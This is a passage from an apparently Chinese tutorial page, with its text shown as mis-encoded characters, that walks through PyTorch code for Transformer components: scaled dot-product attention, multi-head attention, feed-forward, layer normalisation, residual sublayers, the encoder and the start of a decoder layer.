class="hljs-keyword">import</span> torch.nn.functional <span class="hljs-keyword">as</span> F<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attention</span>(<span class="hljs-params">query, key, value, mask=<span class="hljs-literal">None</span>, dropout=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    è¾“å…¥åˆ†åˆ«æ˜¯query, key, value</span><br><span class="hljs-string">    mask: æ©ç å¼ é‡, </span><br><span class="hljs-string">    dropoutï¼šç½®é›¶</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># å–queryçš„æœ€åä¸€ç»´çš„å¤§å°, ç­‰åŒäºè¯åµŒå…¥ç»´åº¦</span><br>    d_k = query.size(-<span class="hljs-number">1</span>)<br>    <span class="hljs-comment"># æŒ‰ç…§æ³¨æ„åŠ›å…¬å¼å¾—åˆ°æ³¨æ„åŠ›å¾—åˆ†å¼ é‡scores</span><br>    scores = torch.matmul(query, key.transpose(-<span class="hljs-number">2</span>, -<span class="hljs-number">1</span>)) / math.sqrt(d_k)<br><br>    <span class="hljs-comment"># åˆ¤æ–­æ˜¯å¦ä½¿ç”¨æ©ç å¼ é‡</span><br>    <span class="hljs-keyword">if</span> mask <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># ä½¿ç”¨tensorçš„masked_fillæ–¹æ³•, å°†æ©ç å¼ é‡å’Œscoreså¼ é‡æ¯ä¸ªä½ç½®ä¸€ä¸€æ¯”è¾ƒ, å¦‚æœæ©ç å¼ é‡å¤„ä¸º0åˆ™å¯¹åº”çš„scoreså¼ é‡ç”¨-1e9è¿™ä¸ªå€¼æ¥æ›¿æ¢</span><br>        scores = scores.masked_fill(mask == <span class="hljs-number">0</span>, -<span class="hljs-number">1e9</span>)<br><br>    <span class="hljs-comment"># è¿›è¡Œsoftmaxæ“ä½œ</span><br>    p_attn = F.softmax(scores, dim = -<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># ä¹‹ååˆ¤æ–­æ˜¯å¦ä½¿ç”¨dropoutè¿›è¡Œéšæœºç½®0</span><br>    <span class="hljs-keyword">if</span> dropout <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        p_attn = dropout(p_attn)<br><br>    <span class="hljs-comment"># æœ€å, æ ¹æ®å…¬å¼å°†p_attnä¸valueå¼ é‡ç›¸ä¹˜è·å¾—æœ€ç»ˆçš„queryæ³¨æ„åŠ›è¡¨ç¤º, åŒæ—¶è¿”å›æ³¨æ„åŠ›å¼ é‡</span><br>    <span class="hljs-keyword">return</span> torch.matmul(p_attn, value), p_attn<br></code></pre></td></tr></table></figure><h3 id="å¤šå¤´æ³¨æ„åŠ›æœºåˆ¶å®ç°"><a href="#å¤šå¤´æ³¨æ„åŠ›æœºåˆ¶å®ç°" class="headerlink" title="å¤šå¤´æ³¨æ„åŠ›æœºåˆ¶å®ç°"></a>å¤šå¤´æ³¨æ„åŠ›æœºåˆ¶å®ç°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> copy<br><br><span class="hljs-comment"># é¦–å…ˆéœ€è¦å®šä¹‰å…‹éš†å‡½æ•°, å› ä¸ºåœ¨å¤šå¤´æ³¨æ„åŠ›æœºåˆ¶çš„å®ç°ä¸­, ç”¨åˆ°å¤šä¸ªç»“æ„ç›¸åŒçš„çº¿æ€§å±‚.</span><br><span class="hljs-comment"># æˆ‘ä»¬å°†ä½¿ç”¨cloneå‡½æ•°å°†ä»–ä»¬ä¸€åŒåˆå§‹åŒ–åœ¨ä¸€ä¸ªç½‘ç»œå±‚åˆ—è¡¨å¯¹è±¡ä¸­ã€‚</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clones</span>(<span class="hljs-params">module, N</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    ç”¨äºç”Ÿæˆç›¸åŒç½‘ç»œå±‚çš„å…‹éš†å‡½æ•°, å®ƒçš„å‚æ•°moduleè¡¨ç¤ºè¦å…‹éš†çš„ç›®æ ‡ç½‘ç»œå±‚, Nä»£è¡¨éœ€è¦å…‹éš†çš„æ•°é‡&quot;&quot;&quot;</span><br>    <span class="hljs-comment"># åœ¨å‡½æ•°ä¸­, æˆ‘ä»¬é€šè¿‡forå¾ªç¯å¯¹moduleè¿›è¡ŒNæ¬¡æ·±åº¦æ‹·è´, ä½¿å…¶æ¯ä¸ªmoduleæˆä¸ºç‹¬ç«‹çš„å±‚,</span><br>    <span class="hljs-comment"># ç„¶åå°†å…¶æ”¾åœ¨nn.ModuleListç±»å‹çš„åˆ—è¡¨ä¸­å­˜æ”¾.</span><br>    <span class="hljs-keyword">return</span> nn.ModuleList([copy.deepcopy(module) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N)])<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiHeadedAttention</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, head, embedding_dim, dropout=<span class="hljs-number">0.1</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        headâ€”â€”å¤´æ•°</span><br><span class="hljs-string">        embedding_dimâ€”â€”è¯åµŒå…¥çš„ç»´åº¦ï¼Œ </span><br><span class="hljs-string">        dropoutâ€”â€”ç½®0æ¯”ç‡ï¼Œé»˜è®¤æ˜¯0.1</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">super</span>(MultiHeadedAttention, self).__init__()<br><br>        <span class="hljs-comment"># åˆ¤æ–­hæ˜¯å¦èƒ½è¢«d_modelæ•´é™¤</span><br>        <span class="hljs-comment"># è¿™æ˜¯å› ä¸ºæˆ‘ä»¬ä¹‹åè¦ç»™æ¯ä¸ªå¤´åˆ†é…ç­‰é‡çš„è¯ç‰¹å¾.ä¹Ÿå°±æ˜¯embedding_dim/headä¸ª.</span><br>        <span class="hljs-keyword">assert</span> embedding_dim % head == <span class="hljs-number">0</span><br><br>        <span class="hljs-comment"># å¾—åˆ°æ¯ä¸ªå¤´è·å¾—çš„åˆ†å‰²è¯å‘é‡ç»´åº¦d_k</span><br>        self.d_k = embedding_dim // head<br>        self.head = head<br><br>        <span class="hljs-comment"># ç„¶åè·å¾—çº¿æ€§å±‚å¯¹è±¡ï¼Œé€šè¿‡nnçš„Linearå®ä¾‹åŒ–ï¼Œå®ƒçš„å†…éƒ¨å˜æ¢çŸ©é˜µæ˜¯embedding_dim x embedding_dimï¼Œç„¶åä½¿ç”¨cloneså‡½æ•°å…‹éš†å››ä¸ªï¼Œ</span><br>        <span class="hljs-comment"># åœ¨å¤šå¤´æ³¨æ„åŠ›ä¸­ï¼ŒQï¼ŒKï¼ŒVå„éœ€è¦ä¸€ä¸ªï¼Œæ‹¼æ¥çš„çŸ©é˜µè¿˜éœ€è¦ä¸€ä¸ªï¼Œä¸€å…±æ˜¯å››ä¸ª.</span><br>        self.linears = clones(nn.Linear(embedding_dim, embedding_dim), <span class="hljs-number">4</span>)<br><br>        <span class="hljs-comment"># self.attnä¸ºNoneï¼Œå®ƒä»£è¡¨æœ€åå¾—åˆ°çš„æ³¨æ„åŠ›å¼ é‡ï¼Œç°åœ¨è¿˜æ²¡æœ‰ç»“æœæ‰€ä»¥ä¸ºNone.</span><br>        self.attn = <span class="hljs-literal">None</span><br>        self.dropout = nn.Dropout(p=dropout)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, query, key, value, mask=<span class="hljs-literal">None</span></span>):<br><br>        <span class="hljs-keyword">if</span> mask <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            mask = mask.unsqueeze(<span class="hljs-number">0</span>)<br><br>        batch_size = query.size(<span class="hljs-number">0</span>)<br><br><br>        <span class="hljs-comment"># [model(x).view(batch_size, -1, self.head, self.d_k).transpose(1, 2) for ...]: åœ¨æ¯æ¬¡è¿­ä»£ä¸­ï¼Œé¦–å…ˆä½¿ç”¨ model(x) å¯¹è¾“å…¥è¿›è¡Œçº¿æ€§å˜æ¢ã€‚ç„¶åä½¿ç”¨ view æ–¹æ³•å°†ç»“æœé‡å¡‘ä¸º (batch_size, -1, self.head, self.d_k) çš„å½¢çŠ¶ï¼Œå…¶ä¸­ batch_size è¡¨ç¤ºæ‰¹å¤„ç†å¤§å°ï¼Œ-1 è¡¨ç¤ºè‡ªåŠ¨è®¡ç®—è¯¥ç»´åº¦å¤§å°ï¼Œself.head è¡¨ç¤ºå¤´çš„æ•°é‡ï¼Œself.d_k è¡¨ç¤ºæ¯ä¸ªå¤´çš„ç»´åº¦ã€‚è¿™æ ·å°±å°†çº¿æ€§å˜æ¢åçš„ç»“æœæŒ‰ç…§å¤´çš„æ•°é‡è¿›è¡Œäº†åˆ†å‰²ã€‚</span><br><br>        <span class="hljs-comment"># transpose(1, 2): æœ€åï¼Œä½¿ç”¨ transpose æ–¹æ³•å°†ç¬¬1å’Œç¬¬2ç»´è¿›è¡Œè½¬ç½®ã€‚åœ¨å¤šå¤´æ³¨æ„åŠ›ä¸­ï¼Œè¿™æ ·åšæ˜¯ä¸ºäº†ä½¿ä»£è¡¨å¥å­é•¿åº¦å’Œè¯å‘é‡ç»´åº¦çš„ç»´åº¦èƒ½å¤Ÿç›¸é‚»ï¼Œä»¥ä¾¿åç»­çš„æ³¨æ„åŠ›è®¡ç®—å¯ä»¥æ­£ç¡®å¤„ç†è¾“å…¥æ•°æ®ã€‚å…·ä½“åœ°ï¼Œè¯¥æ“ä½œå°†å½¢çŠ¶ä» (batch_size, seq_length, head, d_k) è½¬æ¢ä¸º (batch_size, head, seq_length, d_k)ã€‚</span><br><br>        query, key, value = \<br>        [model(x).view(batch_size, -<span class="hljs-number">1</span>, self.head, self.d_k).transpose(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>                     <span class="hljs-keyword">for</span> model, x <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(self.linears, (query, key, value))]<br><br><br>        x, self.attn = attention(query, key, value, mask=mask, dropout=self.dropout)<br><br>        <span class="hljs-comment"># å…ˆå°†ç»´åº¦å¤åŸï¼Œå†ç”±å¤šå¤´è½¬ä¸ºå•å¤´ã€‚</span><br>        x = x.transpose(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>).contiguous().view(batch_size, -<span class="hljs-number">1</span>, self.head * self.d_k)<br><br>        <span class="hljs-comment"># æœ€åä½¿ç”¨çº¿æ€§å±‚åˆ—è¡¨ä¸­çš„æœ€åä¸€ä¸ªçº¿æ€§å±‚å¯¹è¾“å…¥è¿›è¡Œçº¿æ€§å˜æ¢å¾—åˆ°æœ€ç»ˆçš„å¤šå¤´æ³¨æ„åŠ›ç»“æ„çš„è¾“å‡º.</span><br>        <span class="hljs-keyword">return</span> self.linears[-<span class="hljs-number">1</span>](x)<br></code></pre></td></tr></table></figure><div class="note note-info">            <p>contiguous() æ˜¯ PyTorch ä¸­çš„ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºè¿”å›ä¸€ä¸ªå…·æœ‰è¿ç»­å†…å­˜çš„æ–°å¼ é‡ï¼Œå³å°†å¼ é‡çš„å­˜å‚¨é‡æ–°æ’åˆ—ä¸ºè¿ç»­çš„å†…å­˜å—ï¼Œä½¿å¾—å¼ é‡çš„å…ƒç´ åœ¨å†…å­˜ä¸­çš„å¸ƒå±€æ˜¯è¿ç»­çš„ã€‚<br>åœ¨ä¸Šé¢ï¼Œç”±äºè½¬ç½®æ“ä½œï¼Œå‚¨å­˜å†…å­˜å˜å¾—ä¸è¿ç»­äº†ï¼Œæ‰€ä»¥éœ€è¦é‡æ–°è§„åˆ’ã€‚</p>          </div><h3 id="å‰é¦ˆå…¨è¿æ¥å±‚"><a href="#å‰é¦ˆå…¨è¿æ¥å±‚" class="headerlink" title="å‰é¦ˆå…¨è¿æ¥å±‚"></a>å‰é¦ˆå…¨è¿æ¥å±‚</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">PositionwiseFeedForward</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, d_model, d_ff, dropout=<span class="hljs-number">0.1</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        d_modelâ€”â€”çº¿æ€§å±‚çš„è¾“å…¥ç»´åº¦ï¼Œä¹Ÿæ˜¯ç¬¬äºŒä¸ªçº¿æ€§å±‚çš„è¾“å‡ºç»´åº¦</span><br><span class="hljs-string">        d_ffâ€”â€”ç¬¬äºŒä¸ªçº¿æ€§å±‚çš„è¾“å…¥ç»´åº¦å’Œç¬¬ä¸€ä¸ªçº¿æ€§å±‚çš„è¾“å‡ºç»´åº¦</span><br><span class="hljs-string">        dropout=0.1</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">super</span>(PositionwiseFeedForward, self).__init__()<br><br>        <span class="hljs-comment"># é¦–å…ˆæŒ‰ç…§æˆ‘ä»¬é¢„æœŸä½¿ç”¨nnå®ä¾‹åŒ–äº†ä¸¤ä¸ªçº¿æ€§å±‚å¯¹è±¡ï¼Œself.w1å’Œself.w2</span><br>        <span class="hljs-comment"># å®ƒä»¬çš„å‚æ•°åˆ†åˆ«æ˜¯d_model, d_ffå’Œd_ff, d_model</span><br>        self.w1 = nn.Linear(d_model, d_ff)<br>        self.w2 = nn.Linear(d_ff, d_model)<br><br>        self.dropout = nn.Dropout(dropout)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>        <span class="hljs-comment"># é¦–å…ˆç»è¿‡ç¬¬ä¸€ä¸ªçº¿æ€§å±‚ï¼Œç„¶åä½¿ç”¨Funtionalä¸­reluå‡½æ•°è¿›è¡Œæ¿€æ´»,</span><br>        <span class="hljs-comment"># ä¹‹åå†ä½¿ç”¨dropoutè¿›è¡Œéšæœºç½®0ï¼Œæœ€åé€šè¿‡ç¬¬äºŒä¸ªçº¿æ€§å±‚w2ï¼Œè¿”å›æœ€ç»ˆç»“æœ.</span><br>        <span class="hljs-keyword">return</span> self.w2(self.dropout(F.relu(self.w1(x))))<br></code></pre></td></tr></table></figure><h3 id="è§„èŒƒåŒ–å±‚"><a href="#è§„èŒƒåŒ–å±‚" class="headerlink" title="è§„èŒƒåŒ–å±‚"></a>è§„èŒƒåŒ–å±‚</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">LayerNorm</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, features, eps=<span class="hljs-number">1e-6</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        featuresâ€”â€”è¡¨ç¤ºè¯åµŒå…¥çš„ç»´åº¦,</span><br><span class="hljs-string">        epsâ€”â€”å®ƒæ˜¯ä¸€ä¸ªè¶³å¤Ÿå°çš„æ•°, åœ¨è§„èŒƒåŒ–å…¬å¼çš„åˆ†æ¯ä¸­å‡ºç°,é˜²æ­¢åˆ†æ¯ä¸º0.é»˜è®¤æ˜¯1e-6.</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">super</span>(LayerNorm, self).__init__()<br>        self.a2 = nn.Parameter(torch.ones(features))<br>        self.b2 = nn.Parameter(torch.zeros(features))<br>        self.eps = eps<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>        mean = x.mean(-<span class="hljs-number">1</span>, keepdim=<span class="hljs-literal">True</span>)<br>        std = x.std(-<span class="hljs-number">1</span>, keepdim=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">return</span> self.a2 * (x - mean) / (std + self.eps) + self.b2<br></code></pre></td></tr></table></figure><div class="note note-info">            <p>self.a2 æ˜¯ä¸€ä¸ªç”¨ nn.Parameter å°è£…çš„å¯å­¦ä¹ å‚æ•°å¼ é‡ï¼Œå®ƒçš„å½¢çŠ¶ä¸º (features,)ï¼Œå…¶ä¸­ features è¡¨ç¤ºè¾“å…¥ç‰¹å¾çš„ç»´åº¦ã€‚è¿™ä¸ªå‚æ•°æ§åˆ¶å½’ä¸€åŒ–åçš„ç»“æœçš„ç¼©æ”¾æ¯”ä¾‹ã€‚åœ¨åˆå§‹åŒ–æ—¶ï¼Œæˆ‘ä»¬å°†å…¶åˆå§‹åŒ–ä¸ºä¸€ä¸ªå…¨ä¸º1çš„å¼ é‡ï¼Œè¡¨ç¤ºåˆå§‹æ—¶ä¸è¿›è¡Œç¼©æ”¾ã€‚</p><p>self.b2 åŒæ ·æ˜¯ä¸€ä¸ªç”¨ nn.Parameter å°è£…çš„å¯å­¦ä¹ å‚æ•°å¼ é‡ï¼Œå½¢çŠ¶ä¹Ÿä¸º (features,)ã€‚è¿™ä¸ªå‚æ•°æ§åˆ¶å½’ä¸€åŒ–åçš„ç»“æœçš„å¹³ç§»åç§»ã€‚åœ¨åˆå§‹åŒ–æ—¶ï¼Œæˆ‘ä»¬å°†å…¶åˆå§‹åŒ–ä¸ºä¸€ä¸ªå…¨ä¸º0çš„å¼ é‡ï¼Œè¡¨ç¤ºåˆå§‹æ—¶ä¸è¿›è¡Œå¹³ç§»ã€‚</p><p>åœ¨è¿›è¡Œ Layer Normalization è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å…ˆè®¡ç®—è¾“å…¥å¼ é‡ x æ²¿ç€æœ€åä¸€ä¸ªç»´åº¦çš„å‡å€¼å’Œæ ‡å‡†å·®ï¼Œç„¶åå¯¹è¾“å…¥è¿›è¡Œå½’ä¸€åŒ–ã€‚å½’ä¸€åŒ–çš„ç»“æœä¸º (x - mean) &#x2F; (std + eps)ï¼Œå…¶ä¸­ eps æ˜¯ä¸€ä¸ªè¶³å¤Ÿå°çš„æ•°ï¼Œç”¨äºé˜²æ­¢åˆ†æ¯ä¸º0çš„æƒ…å†µã€‚ç„¶åï¼Œæˆ‘ä»¬å°†å½’ä¸€åŒ–åçš„ç»“æœä¹˜ä»¥ self.a2ï¼ˆç¼©æ”¾ï¼‰å¹¶åŠ ä¸Š self.b2ï¼ˆå¹³ç§»ï¼‰ï¼Œå¾—åˆ°æœ€ç»ˆçš„å½’ä¸€åŒ–ç»“æœã€‚</p>          </div><h3 id="å­å±‚è¿æ¥ç»“æ„-Add"><a href="#å­å±‚è¿æ¥ç»“æ„-Add" class="headerlink" title="å­å±‚è¿æ¥ç»“æ„(Add)"></a>å­å±‚è¿æ¥ç»“æ„(Add)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SublayerConnection</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, size, dropout=<span class="hljs-number">0.1</span></span>):<br><br>        <span class="hljs-built_in">super</span>(SublayerConnection, self).__init__()<br>        <span class="hljs-comment"># å®ä¾‹åŒ–äº†è§„èŒƒåŒ–å¯¹è±¡self.norm</span><br>        self.norm = LayerNorm(size)<br>        <span class="hljs-comment"># åˆä½¿ç”¨nnä¸­é¢„å®šä¹‰çš„droupoutå®ä¾‹åŒ–ä¸€ä¸ªself.dropoutå¯¹è±¡.</span><br>        self.dropout = nn.Dropout(p=dropout)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x, sublayer</span>):<br>        <span class="hljs-keyword">return</span> x + self.dropout(sublayer(self.norm(x)))<br></code></pre></td></tr></table></figure><h3 id="ç¼–ç å™¨"><a href="#ç¼–ç å™¨" class="headerlink" title="ç¼–ç å™¨"></a>ç¼–ç å™¨</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">class</span> <span class="hljs-title class_">EncoderLayer</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, size, self_attn, feed_forward, dropout</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        sizeï¼Œè¯åµŒå…¥ç»´åº¦çš„å¤§å°ï¼Œå®ƒä¹Ÿå°†ä½œä¸ºç¼–ç å™¨å±‚çš„å¤§å°</span><br><span class="hljs-string">        self_attnï¼Œå¤šå¤´è‡ªæ³¨æ„åŠ›å­å±‚å®ä¾‹åŒ–å¯¹è±¡,è‡ªæ³¨æ„åŠ›æœºåˆ¶ </span><br><span class="hljs-string">        feed_froward,å‰é¦ˆå…¨è¿æ¥å±‚å®ä¾‹åŒ–å¯¹è±¡</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">super</span>(EncoderLayer, self).__init__()<br><br>        <span class="hljs-comment"># é¦–å…ˆå°†self_attnå’Œfeed_forwardä¼ å…¥å…¶ä¸­.</span><br>        self.self_attn = self_attn<br>        self.feed_forward = feed_forward<br><br>        <span class="hljs-comment"># å¦‚å›¾æ‰€ç¤º, ç¼–ç å™¨å±‚ä¸­æœ‰ä¸¤ä¸ªå­å±‚è¿æ¥ç»“æ„, æ‰€ä»¥ä½¿ç”¨cloneså‡½æ•°è¿›è¡Œå…‹éš†</span><br>        self.sublayer = clones(SublayerConnection(size, dropout), <span class="hljs-number">2</span>)<br>        <span class="hljs-comment"># æŠŠsizeä¼ å…¥å…¶ä¸­</span><br>        self.size = size<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x, mask</span>):<br><br>        x = self.sublayer[<span class="hljs-number">0</span>](x, <span class="hljs-keyword">lambda</span> x: self.self_attn(x, x, x, mask))<br>        <span class="hljs-keyword">return</span> self.sublayer[<span class="hljs-number">1</span>](x, self.feed_forward)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Encoder</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, layer, N</span>):<br><br>        <span class="hljs-built_in">super</span>(Encoder, self).__init__()<br>        <span class="hljs-comment"># é¦–å…ˆä½¿ç”¨cloneså‡½æ•°å…‹éš†Nä¸ªç¼–ç å™¨å±‚æ”¾åœ¨self.layersä¸­</span><br>        self.layers = clones(layer, N)<br>        <span class="hljs-comment"># å†åˆå§‹åŒ–ä¸€ä¸ªè§„èŒƒåŒ–å±‚, å®ƒå°†ç”¨åœ¨ç¼–ç å™¨çš„æœ€åé¢.</span><br>        self.norm = LayerNorm(layer.size)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x, mask</span>):<br>        <span class="hljs-keyword">for</span> layer <span class="hljs-keyword">in</span> self.layers:<br>            x = layer(x, mask)<br>        <span class="hljs-keyword">return</span> self.norm(x)<br></code></pre></td></tr></table></figure><h2 id="è§£ç å™¨éƒ¨åˆ†"><a href="#è§£ç å™¨éƒ¨åˆ†" class="headerlink" title="è§£ç å™¨éƒ¨åˆ†"></a>è§£ç å™¨éƒ¨åˆ†</h2><ul><li>ç”±Nä¸ªè§£ç å™¨å±‚å †å è€Œæˆ</li><li>æ¯ä¸ªè§£ç å™¨å±‚ç”±ä¸‰ä¸ªå­å±‚è¿æ¥ç»“æ„ç»„æˆ</li><li>ç¬¬ä¸€ä¸ªå­å±‚è¿æ¥ç»“æ„åŒ…æ‹¬ä¸€ä¸ªå¤šå¤´è‡ªæ³¨æ„åŠ›å­å±‚å’Œè§„èŒƒåŒ–å±‚ä»¥åŠä¸€ä¸ªæ®‹å·®è¿æ¥</li><li>ç¬¬äºŒä¸ªå­å±‚è¿æ¥ç»“æ„åŒ…æ‹¬ä¸€ä¸ªå¤šå¤´æ³¨æ„åŠ›å­å±‚å’Œè§„èŒƒåŒ–å±‚ä»¥åŠä¸€ä¸ªæ®‹å·®è¿æ¥</li><li>ç¬¬ä¸‰ä¸ªå­å±‚è¿æ¥ç»“æ„åŒ…æ‹¬ä¸€ä¸ªå‰é¦ˆå…¨è¿æ¥å­å±‚å’Œè§„èŒƒåŒ–å±‚ä»¥åŠä¸€ä¸ªæ®‹å·®è¿æ¥</li></ul><h3 id="è§£ç å™¨å±‚"><a href="#è§£ç å™¨å±‚" class="headerlink" title="è§£ç å™¨å±‚"></a>è§£ç å™¨å±‚</h3><p>Decoder Block çš„ç¬¬ä¸€ä¸ª Multi-Head Attention é‡‡ç”¨äº† Mask æ“ä½œï¼Œç¬¬äºŒä¸ª Multi-Head Attention ä¸»è¦çš„åŒºåˆ«åœ¨äº Attention çš„ K, V çŸ©é˜µä¸æ˜¯æ¥è‡ªä¸Šä¸€ä¸ª Decoder Block çš„è¾“å‡ºè®¡ç®—çš„ï¼Œè€Œæ˜¯æ¥è‡ªEncoderçš„ç¼–ç ä¿¡æ¯çŸ©é˜µCã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DecoderLayer</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, size, self_attn, src_attn, feed_forward, dropout</span>):<br>        <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        sizeâ€”â€”è¯åµŒå…¥çš„ç»´åº¦å¤§å°ï¼Œè§£ç å™¨çš„å°ºå¯¸</span><br><span class="hljs-string">        